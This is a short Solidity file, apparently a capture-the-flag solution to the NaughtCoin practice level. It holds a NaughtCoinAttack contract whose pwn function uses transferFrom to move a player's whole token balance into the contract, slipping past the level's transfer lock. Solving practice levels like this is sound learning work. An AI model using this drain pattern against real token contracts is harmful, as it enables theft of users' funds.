//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function player() external view returns(address);
}
//0x85bE4976019899a155bC3827B4b384800658053F

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);
}

contract NaughtCoinAttack {

    //1. deploy
    //2.approve
    //3. pwn


    
    function pwn(IERC20 coin) external {
        address player = INaughtCoin(address(coin)).player();
        uint totalBalance = coin.balanceOf(player);
        coin.transferFrom(player, address(this), totalBalance);
    }


}


